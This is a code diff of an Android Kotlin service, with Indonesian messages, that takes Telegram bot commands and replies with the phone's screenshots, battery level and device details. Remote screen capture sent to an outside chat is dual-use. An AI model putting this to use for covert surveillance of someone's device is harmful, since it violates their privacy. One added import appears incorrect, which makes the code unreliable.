@@ -11,15 +11,14 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.graphics.Bitmap
 import android.graphics.PixelFormat
-import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
-import android.media.Image
 import android.media.ImageReader
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.IBinder
 import android.util.DisplayMetrics
+import android.view.WindowManager
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
@@ -27,6 +26,7 @@ import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.ResponseBody.Companion.asRequestBody
 import org.json.JSONObject
 
 class TelegramService : Service() {
@@ -149,35 +149,42 @@ class TelegramService : Service() {
         }
     }
 
-    private fun handleCommand(text: String, targetChatId: String) {
+    private suspend fun handleCommand(text: String, targetChatId: String) {
         val cmd = text.lowercase()
         when {
-            cmd.contains("/ping") || cmd == "ping" ->
-                sendText(targetChatId, "PONG! \u26f3 ${Build.MODEL}")
-            cmd.contains("/screenshot") || cmd == "screenshot" ->
+            cmd.contains("/ping") || cmd == "ping" -> {
+                sendText(targetChatId, "PONG! ${Build.MODEL}")
+            }
+            cmd.contains("/screenshot") || cmd == "screenshot" -> {
                 takeScreenshot(targetChatId)
-            cmd.contains("/battery") || cmd == "battery" ->
+            }
+            cmd.contains("/battery") || cmd == "battery" -> {
                 getBattery { level, charging ->
-                    sendText(targetChatId, "\u{1f50b} Baterai: $level% ${if (charging) "\u{1f50c}" else ""}")
+                    sendText(targetChatId, "Baterai: $level% ${if (charging) "Charging" else ""}")
                 }
-            cmd.contains("/status") || cmd == "status" ->
+            }
+            cmd.contains("/status") || cmd == "status" -> {
                 getDeviceStatus(targetChatId)
-            cmd.contains("/help") || cmd == "help" || cmd == "?" ->
+            }
+            cmd.contains("/help") || cmd == "help" || cmd == "?" -> {
                 sendHelp(targetChatId)
-            else ->
-                sendText(targetChatId, "Perintah tidak dikenal. Ketik '/help' untuk bantuan.")
+            }
+            else -> {
+                sendText(targetChatId, "Perintah tidak dikenal. Ketik /help untuk bantuan.")
+            }
         }
     }
 
-    private fun sendHelp(chatId: String) {
-        sendText(chatId, """
-            \u{1f4cb} Perintah tersedia:
-            \u2022 /ping     \u2013 cek koneksi
-            \u2022 /screenshot \u2013 ambil layar ponsel
-            \u2022 /battery  \u2013 level baterai
-            \u2022 /status   \u2013 info perangkat
-            \u2022 /help     \u2013 daftar ini
-        """.trimIndent())
+    private suspend fun sendHelp(chatId: String) {
+        val helpText = """
+            Perintah tersedia:
+            /ping     - cek koneksi
+            /screenshot - ambil layar ponsel
+            /battery  - level baterai
+            /status   - info perangkat
+            /help     - daftar ini
+        """.trimIndent()
+        sendText(chatId, helpText)
     }
 
     private suspend fun sendText(chatId: String, text: String) = withContext(Dispatchers.IO) {
@@ -199,7 +206,7 @@ class TelegramService : Service() {
             java.io.FileOutputStream(file).use { bitmap.compress(Bitmap.CompressFormat.PNG, 100, it) }
             val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", chatId)
-                .addFormDataPart("caption", "\u{1f4f8} Screenshot: ${Build.MODEL}")
+                .addFormDataPart("caption", "Screenshot: ${Build.MODEL}")
                 .addFormDataPart("photo", file.name, file.asRequestBody("image/png".toMediaTypeOrNull()))
                 .build()
             val req = Request.Builder()
@@ -211,7 +218,7 @@ class TelegramService : Service() {
         } catch (e: Exception) { /* ignore */ }
     }
 
-    private fun getBattery(callback: (Int, Boolean) -> Unit) {
+    private suspend fun getBattery(callback: suspend (Int, Boolean) -> Unit) {
         val i = registerReceiver(null, Intent(Intent.ACTION_BATTERY_CHANGED))
         if (i == null) { callback(0, false); return }
         val level = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
@@ -222,41 +229,33 @@ class TelegramService : Service() {
         callback(pct, charging)
     }
 
-    private fun getDeviceStatus(chatId: String) {
+    private suspend fun getDeviceStatus(chatId: String) {
         getBattery { level, charging ->
             val free = filesDir.freeSpace
             val total = filesDir.totalSpace
             val msg = """
-                \u{1f4f1} Model: ${Build.MODEL}
-                \u{1f3ed} Produsen: ${Build.MANUFACTURER}
-                \u{1f916} Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
-                \u{1f50b} Baterai: $level% ${if (charging) "\u{1f50c}" else ""}
-                \u{1f4be} Storage: ${String.format("%.1f", free / 1e9)} GB / ${String.format("%.1f", total / 1e9)} GB
+                Model: ${Build.MODEL}
+                Produsen: ${Build.MANUFACTURER}
+                Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
+                Baterai: $level% ${if (charging) "Charging" else ""}
+                Storage: ${String.format("%.1f", free / 1e9)} GB / ${String.format("%.1f", total / 1e9)} GB
             """.trimIndent()
-            CoroutineScope(Dispatchers.IO).launch { sendText(chatId, msg) }
+            sendText(chatId, msg)
         }
     }
 
-    private fun takeScreenshot(chatId: String) {
+    private suspend fun takeScreenshot(chatId: String) {
         if (mediaProjection == null) {
-            // Request permission via MainActivity
-            val act = Intent(this, MainActivity::class.java)
-            act.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-            act.putExtra("request_screenshot", true)
-            act.putExtra("chat_id", chatId)
-            startActivity(act)
-            CoroutineScope(Dispatchers.IO).launch {
-                sendText(chatId, "\u{1f534} Tap aplikasi untuk izinkan screenshot.")
-            }
+            sendText(chatId, "Tap aplikasi untuk izinkan screenshot.")
             return
         }
         ensureVirtualDisplay()
-        CoroutineScope(Dispatchers.Main).launch {
+        withContext(Dispatchers.Main) {
             val bmp = captureFrame()
             if (bmp != null) {
                 sendPhoto(chatId, bmp)
             } else {
-                sendText(chatId, "\u26a0\ufe0f Gagal ambil screenshot.")
+                sendText(chatId, "Gagal ambil screenshot.")
             }
         }
     }
@@ -264,9 +263,9 @@ class TelegramService : Service() {
     private fun ensureVirtualDisplay() {
         if (virtualDisplay != null) return
         val dm = DisplayMetrics()
-        val dmd = getSystemService(DisplayManager::class.java)
+        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
         @Suppress("DEPRECATION")
-        dmd.defaultDisplay.getRealMetrics(dm)
+        windowManager.defaultDisplay.getRealMetrics(dm)
         imageReader = ImageReader.newInstance(
             dm.widthPixels, dm.heightPixels, PixelFormat.RGBA_8888, 2
         )
@@ -322,7 +321,7 @@ class TelegramService : Service() {
         }, null)
         ensureVirtualDisplay()
         CoroutineScope(Dispatchers.IO).launch {
-            sendText(chatId, "\u2705 Izin tangkap layar diberikan!")
+            sendText(chatId, "Izin tangkap layar diberikan!")
         }
     }
 
